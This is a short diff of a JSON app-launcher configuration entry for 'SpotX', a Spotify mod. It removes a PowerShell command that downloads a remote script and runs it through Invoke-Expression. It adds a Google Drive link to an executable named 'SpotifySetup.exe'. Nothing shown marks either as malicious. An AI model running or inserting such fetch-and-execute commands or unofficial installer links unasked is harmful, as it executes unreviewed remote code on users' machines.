@@ -98,7 +98,8 @@
       "name": "SpotX",
       "open": true,
       "openpath": "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Spotify\\Spotify.exe",
-      "command": "powershell.exe -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12; $p='-new_theme'; $script = try { (iwr -useb 'https://raw.githubusercontent.com/SpotX-Official/spotx-official.github.io/main/run.ps1').Content } catch { $p += ' -m'; (iwr -useb 'https://spotx-official.github.io/run.ps1').Content }; Invoke-Expression $script\"",
+      "googleDriveUrl": "https://drive.usercontent.google.com/download?id=1gDMjleoubg0a7q97igtqFSqUyR1rpRw-&export=download&authuser=0&confirm=t&uuid=c8003afe-5246-459b-bf0b-9238cbe5cb70&at=ALoNOgnZkY-Y4H9r7IwCisNM7Puj%3A1749414600915",
+      "installerFilename": "SpotifySetup.exe",
       "description": "Мод на спотифай",
       "iconPath": "spotx.png",
       "installPaths": [
